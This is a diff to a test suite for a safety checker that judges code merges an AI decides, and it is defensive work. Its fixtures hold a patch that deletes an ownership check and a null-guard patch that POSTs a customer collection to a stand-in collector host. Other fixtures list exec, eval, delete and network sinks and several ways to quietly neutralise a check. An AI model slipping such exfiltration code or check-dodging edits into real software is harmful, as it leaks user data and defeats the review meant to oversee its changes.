@@ -705,18 +705,22 @@ describe("judgedTheVerifiedFiles (#200)", () => {
 
 describe("assessMergeFloor: the safety floor under every merge Gemini decides", () => {
   const floor = (patch: string, over: Partial<BlastRadiusConfig> = {}) => assessMergeFloor(patch, { excludedPaths: [], baseFiles: basesOf(patch), ...over });
-  /** A change gate 1 refuses for its shape alone: no allowed class, larger than its limits. */
+  /**
+   * A change gate 1 refuses for its shape alone: no allowed class, larger than its limits. It removes no deciding line
+   * and calls only what the handler already calls (`load`, `log`), so the floor lets it through.
+   */
   const rewrite = diff(SRC, [
     "  const order = await load(id);",
-    "-  return order.total;",
+    "+  const parent = await load(data.parentId);",
+    "+  if (parent == null) return null;",
     "+  const items = order.items ?? [];",
-    "+  const names = items.map((item) => item.name);",
-    "+  const unique = [...new Set(names)];",
-    "+  const sorted = unique.sort();",
-    "+  log(\"names\", sorted.length);",
-    "+  const label = sorted.join(\", \");",
-    "+  const result = { label };",
-    "+  return result.label;",
+    "+  const parentItems = parent.items ?? [];",
+    "+  const merged = [...items, ...parentItems];",
+    "+  log(\"items\", merged.length);",
+    "+  const first = merged[0];",
+    "+  const label = first?.name ?? null;",
+    "+  log(\"label\", label);",
+    "   return order.total;",
   ]);
 
   it("allows what gate 1 allows, and changes gate 1 refuses only for their shape", () => {
@@ -772,5 +776,234 @@ describe("assessMergeFloor: the safety floor under every merge Gemini decides", 
     expect(floor(guard, { baseFiles: new Map([[SRC, "something else\n"]]) }).problems).toContain("base-mismatch");
     expect(floor("not a diff").problems).toContain("diff-not-understood");
     expect(floor(guard.replace("return null;", "return null;\u2028")).problems).toContain("control-characters");
+  });
+});
+
+describe("assessMergeFloor: what the changed code does, not only the words it uses (#295)", () => {
+  const floor = (patch: string, over: Partial<BlastRadiusConfig> = {}) => assessMergeFloor(patch, { excludedPaths: [], baseFiles: basesOf(patch), ...over });
+  const ORDERS = "functions/src/orders.ts";
+
+  it("refuses the deleted ownership check the issue reported (it names no hard-exclude word)", () => {
+    const base = [
+      'import { db } from "./firebase";',
+      "",
+      "export const getOrder = onCall(async (req) => {",
+      '  const snap = await db.collection("orders").doc(req.data.id).get();',
+      "  const order = snap.data();",
+      '  if (order.createdBy !== req.user.id) throw new HttpsError("not-found", "No such order");',
+      "  return order.items;",
+      "});",
+    ].join("\n") + "\n";
+    const patch = [
+      `--- a/${ORDERS}`,
+      `+++ b/${ORDERS}`,
+      "@@ -4,5 +4,4 @@",
+      '   const snap = await db.collection("orders").doc(req.data.id).get();',
+      "   const order = snap.data();",
+      '-  if (order.createdBy !== req.user.id) throw new HttpsError("not-found", "No such order");',
+      "   return order.items;",
+      " });",
+      "",
+    ].join("\n");
+    const r = floor(patch, { baseFiles: new Map([[ORDERS, base]]) });
+    expect(r.allowed).toBe(false);
+    expect(r.problems).toEqual(expect.arrayContaining(["removes-a-decision", "removes-a-call"]));
+  });
+
+  it("refuses the null guard with a request that posts a collection away, as the issue reported", () => {
+    const base = [
+      'import { db } from "./firebase";',
+      "",
+      "export async function getOrder(id: string) {",
+      '  const snap = await db.collection("orders").doc(id).get();',
+      "  const order = snap.data();",
+      "  return order.items;",
+      "}",
+    ].join("\n") + "\n";
+    const patch = [
+      `--- a/${ORDERS}`,
+      `+++ b/${ORDERS}`,
+      "@@ -3,5 +3,7 @@",
+      " export async function getOrder(id: string) {",
+      '   const snap = await db.collection("orders").doc(id).get();',
+      "   const order = snap.data();",
+      "+  if (order == null) return null;",
+      '+  await fetch("https://collector.example/o", { method: "POST", body: JSON.stringify(await db.collection("customers").get().then((q) => q.docs.map((d) => d.data()))) });',
+      "   return order.items;",
+      " }",
+      "",
+    ].join("\n");
+    const r = floor(patch, { baseFiles: new Map([[ORDERS, base]]) });
+    expect(r.allowed).toBe(false);
+    expect(r.problems).toEqual(expect.arrayContaining(["adds-sink:network", "adds-url", "adds-a-new-call"]));
+  });
+
+  describe("still allows the fixes the floor was built for", () => {
+    const awaitReturn = diff(SRC, ['  const ref = db.collection("orders").doc(id);', "-  return ref.set(data);", "+  return await ref.set(data);", "   // written"]);
+    const chainedReturn = diff(SRC, ["  const order = await load(id);", "-  return order.items.length;", "+  return order?.items?.length ?? null;", "   // done"]);
+    const throwsError = diff(SRC, ["  const order = await load(id);", '+  if (order == null) throw new Error("no such order");', "   return order.total;"]);
+    const callsPure = diff(SRC, ["  const order = await load(id);", "+  const items = Array.isArray(order.items) ? order.items : [];", "+  const n = Number(order.count ?? items.length);", '+  log("count", String(n));', "   return order.total;"]);
+    it.each([
+      ["a null guard", guard],
+      ["a guard written as a block", guardBlock],
+      ["optional chaining and `?? null`", chaining],
+      ["a missing await", missingAwait],
+      ["a missing await on a returned call (a deciding line rewritten as itself, guarded)", awaitReturn],
+      ["`?.` on a returned value", chainedReturn],
+      ["a Firestore undefined field, spread", undefinedField],
+      ["a Firestore undefined field, `?? null`", coalesceNull],
+      ["a guard that throws a standard error", throwsError],
+      ["pure conversions and checks the base never calls", callsPure],
+      ["a null guard with a new test file", guard + addedTest],
+    ])("%s", (_name, patch) => {
+      expect(floor(patch)).toMatchObject({ allowed: true, problems: [] });
+    });
+
+    it("a guard that throws the error class the handler already throws", () => {
+      const p = diff(SRC, ['  if (data == null) throw new HttpsError("invalid-argument", "no data");', "  const order = await load(id);", '+  if (order == null) throw new HttpsError("not-found", "no such order");', "   return order.total;"]);
+      expect(floor(p)).toMatchObject({ allowed: true, problems: [] });
+    });
+  });
+
+  describe("a removed line that decides or steers", () => {
+    it.each([
+      ["a guard", ["  const order = await load(id);", '-  if (order.state === "closed") return null;', "   return order.total;"]],
+      ["a return", ["  const order = await load(id);", "-  return order.total;", "   // done"]],
+      ["a throw", ["  const order = await load(id);", '-  throw new Error("stop");', "   // done"]],
+      ["one side of a condition", ["  const order = await load(id);", "-  const ok = order.open &&", "-    order.paidAt != null;", "+  const ok = order.open;", "   return ok;"]],
+      ["the brace that closes a block", ["  if (order.open) {", "    ship(order);", "-  }", '   log("x", id);', "+  }"]],
+      ["a deciding line rewritten into another decision", ["  const order = await load(id);", "-  if (order.count > 1) return null;", "+  if (order.count > 2) return null;", "   return order.total;"]],
+      ["a `?.` taken away", ["  const order = await load(id);", "-  const n = order?.items;", "+  const n = order.items;", "   return n;"]],
+    ])("refuses %s", (_name, body) => {
+      expect(floor(diff(SRC, body))).toMatchObject({ allowed: false, problems: expect.arrayContaining(["removes-a-decision"]) });
+    });
+
+    it("refuses a call taken out of the file, a check written as a call among them", () => {
+      expect(floor(diff(SRC, ["  const order = await load(id);", "-  record(order);", "   return order.total;"])).problems).toContain("removes-a-call");
+    });
+  });
+
+  describe("added code that reaches a sink, whether or not the base already does", () => {
+    it.each([
+      ["network", "  await fetch(target);"],
+      ["network", "  https.get(target, done);"],
+      ["network", "  await axios.post(target, order);"],
+      ["network", "  const x = new XMLHttpRequest();"],
+      ["network", "  const ws = new WebSocket(target);"],
+      ["network", "  net.connect(port, host);"],
+      ["dynamic-code", '  globalThis["fet" + "ch"](target);'],
+      ["process", "  exec(command);"],
+      ["process", '  spawn("sh", args);'],
+      ["process", "  child_process.execSync(command);"],
+      ["dynamic-code", "  eval(source);"],
+      ["dynamic-code", "  const f = new Function(source);"],
+      ["dynamic-code", "  order.constructor.constructor(source)();"],
+      ["destructive", "  await ref.delete();"],
+      ["destructive", "  await db.recursiveDelete(ref);"],
+      ["destructive", "  await deleteDoc(ref);"],
+      ["destructive", "  batch.delete(ref);"],
+      ["filesystem", "  fs.writeFileSync(path, body);"],
+      ["filesystem", "  await unlink(path);"],
+    ])("refuses %s: %s", (kind, line) => {
+      // The base already makes the same call: a sink is refused all the same.
+      const p = diff(SRC, [` ${line}`, "  const order = await load(id);", `+${line}`, "   return order.total;"]);
+      expect(floor(p)).toMatchObject({ allowed: false, problems: expect.arrayContaining([`adds-sink:${kind}`]) });
+    });
+
+    it("refuses a sink in a new test file too: once merged it runs in the target's CI", () => {
+      const test = addedTest.replace("+});", "+  await fetch(target);\n+});").replace("@@ -0,0 +1,3 @@", "@@ -0,0 +1,4 @@");
+      expect(floor(guard + test).problems).toContain("adds-sink:network");
+    });
+
+    it("lets a new test file fail by `process.exit(1)`, never production code", () => {
+      const test = addedTest.replace("+});", "+  if (x !== null) process.exit(1);\n+});").replace("@@ -0,0 +1,3 @@", "@@ -0,0 +1,4 @@");
+      expect(floor(guard + test)).toMatchObject({ allowed: true, problems: [] });
+      expect(floor(diff(SRC, ["  const order = await load(id);", "+  if (order == null) process.exit(1);", "   return order.total;"])).problems).toContain("adds-sink:process");
+    });
+
+    it("passes the plain-JavaScript fixes the loop's emulator suite takes to a merge candidate", () => {
+      const FILE = "functions/src/orders/createOrder.js";
+      const TFILE = "functions/src/orders/createOrder.test.js";
+      const base = "function get(o) {\n  const x = o;\n  return x.total;\n}\nmodule.exports = { get };\n";
+      const test = [`diff --git a/${TFILE} b/${TFILE}`, "new file mode 100644", "--- /dev/null", `+++ b/${TFILE}`, "@@ -0,0 +1,2 @@", '+const { get } = require("./createOrder.js");', "+if (get(undefined) !== null) process.exit(1);"];
+      const fix = (guardLine: string) => [`--- a/${FILE}`, `+++ b/${FILE}`, `@@ -1,5 +1,${5 + guardLine.split("\n").length} @@`, " function get(o) {", "   const x = o;", `+${guardLine}`, "   return x.total;", " }", " module.exports = { get };", ...test, ""].join("\n");
+      for (const g of ["  if (x == null) return null;", "  if (x == null) return null;\n+  if (x.total === undefined) return null;"]) expect(assessMergeFloor(fix(g), { excludedPaths: [], baseFiles: new Map([[FILE, base]]) })).toMatchObject({ allowed: true, problems: [] });
+    });
+  });
+
+  describe("added code that calls what the base file never does", () => {
+    it.each([
+      ["a function the base never calls", "+  await notify(order);", "adds-a-new-call"],
+      ["a function the base never calls, inside a call it does make", '+  log("x", notify(order));', "adds-a-new-call"],
+      ["a method the base never calls", "+  const label = order.name.toUpperCase();", "adds-a-new-call"],
+      ["console (a value written to the log is not a fix)", "+  console.log(order);", "adds-a-new-call"],
+      ["a constructor the base never uses", "+  const seen = new Map();", "adds-a-new-call"],
+      ["a tagged template", "+  const q = sql`select 1`;", "adds-a-new-call"],
+      ["a call of something that is not a name", "+  handlers[order.kind](order);", "adds-a-computed-call"],
+      ["a call of a call's result", "+  load(id)(order);", "adds-a-computed-call"],
+      ["a new binding for a name the base calls", "+  const load = order.loader;", "rebinds-a-called-name"],
+      ["a new binding for a pure call", "+  const String = order.loader;", "rebinds-a-called-name"],
+      ["an arrow parameter named like a call the base makes", "+  [order.loader].map((log) => log(id));", "rebinds-a-called-name"],
+    ])("refuses %s", (_name, line, problem) => {
+      const p = diff(SRC, ["  const order = await load(id);", line, "   return order.total;"]);
+      expect(floor(p)).toMatchObject({ allowed: false, problems: expect.arrayContaining([problem]) });
+    });
+
+    it("judges the base's calls on its code: a call named only in its strings or comments does not count", () => {
+      const p = diff(SRC, ['  const note = "notify(order)"; // notify(order)', "  const order = await load(id);", "+  await notify(order);", "   return order.total;"]);
+      expect(floor(p).problems).toContain("adds-a-new-call");
+    });
+
+    it("refuses an added line it cannot read for certain", () => {
+      expect(floor(diff(SRC, ["  const order = await load(id);", "+  const s = `start", "   return order.total;"])).problems).toContain("added-line-not-understood");
+    });
+  });
+
+  it("refuses an address added anywhere in a line", () => {
+    for (const line of ['+  const target = "https://collector.example/o";', "+  const target = `ftp://${id}`;", "+  // see http://example.com"]) {
+      expect(floor(diff(SRC, ["  const order = await load(id);", line, "   return order.total;"])).problems).toContain("adds-url");
+    }
+  });
+
+  describe("a check neutralised without removing it (review of #295)", () => {
+    /** A check written as a call whose name and body dodge the word list: `checkOrder` compares `o.placedBy !== who`. */
+    const around = (body: string[]) => diff(SRC, ["  const order = await load(id);", ...body, "   return order.total;"]);
+    it.each([
+      ["a check wrapped in try/catch", around(["-  await checkOrder(order, who);", "+  try {", "+    await checkOrder(order, who);", "+  } catch {}"]), "adds-try-catch"],
+      ["a check wrapped in try/catch, the check left as context", around(["+  try {", "   await checkOrder(order, who);", "+  } catch {}"]), "adds-try-catch"],
+      ["a promise's .catch on a check", around(["-  await checkOrder(order, who);", "+  await checkOrder(order, who).catch(() => null);"]), "removes-a-decision"],
+      ["an early return above a check", around(["+  if (order) return order;", "   await checkOrder(order, who);"]), "adds-control-flow"],
+      ["a check made conditional", around(["-  checkOrder(order, who);", "+  if (order === null) checkOrder(order, who);"]), "removes-a-decision"],
+      ["a check's arguments changed", around(["-  checkOrder(order, who);", "+  checkOrder(order, order.placedBy);"]), "removes-a-decision"],
+      ["a check wrapped in a new block", around(["+  if (order === null) {", "   checkOrder(order, who);", "+  }"]), "adds-unbalanced-brackets"],
+      ["a check wrapped in a function never called", around(["+  const skip = () => {", "   checkOrder(order, who);", "+  };"]), "adds-unbalanced-brackets"],
+      ["a return that is not a null guard", around(["+  if (order.total == null) return 0;", "   checkOrder(order, who);"]), "adds-control-flow"],
+      ["a loop", around(["+  for (const item of order.items) log(\"item\", item);", "   checkOrder(order, who);"]), "adds-control-flow"],
+      ["a null guard that becomes a braceless if's body", around(["  if (order.held === true)", "+  if (order == null) return null;", "    checkOrder(order, who);"]), "adds-control-flow"],
+    ])("refuses %s", (_name, patch, problem) => {
+      expect(floor(patch)).toMatchObject({ allowed: false, problems: expect.arrayContaining([problem]) });
+    });
+
+    it("allows a null guard whose error is a Firebase v1 HttpsError the handler already throws, with no network sink", () => {
+      const v1 = (line: string) => diff(SRC, ['  if (data == null) throw new functions.https.HttpsError("invalid-argument", "no data");', "  const snap = await load(id);", line, "   return snap.total;"]);
+      expect(floor(v1('+  if (snap == null) throw new functions.https.HttpsError("not-found", "no such order", id);'))).toMatchObject({ allowed: true, problems: [] });
+      // `!snap.exists` is not an explicit null check: refused as control flow, never as a network call.
+      const r = floor(v1('+  if (!snap.exists) throw new functions.https.HttpsError("not-found", "no such order");'));
+      expect(r.problems).toContain("adds-control-flow");
+      expect(r.problems).not.toContain("adds-sink:network");
+    });
+  });
+
+  it("refuses a JSX file with its own reason: the scanner does not read JSX text", () => {
+    for (const path of ["functions/src/orders/Order.tsx", "web/src/orders/Order.jsx"]) {
+      const p = diff(path, ["  const order = await load(id);", "+  if (order == null) return null;", "   return <p>Don't ship {order.total}</p>;"]);
+      expect(floor(p)).toMatchObject({ allowed: false, problems: ["jsx-not-judged"] });
+    }
+  });
+
+  it("refuses more than 40 changed lines in the production file", () => {
+    const many = (n: number) => diff(SRC, ["  const order = await load(id);", ...Array.from({ length: n }, (_, k) => `+  log("step", ${k});`), "   return order.total;"]);
+    expect(floor(many(40))).toMatchObject({ allowed: true });
+    expect(floor(many(41))).toMatchObject({ allowed: false, problems: ["change-too-large"] });
   });
 });
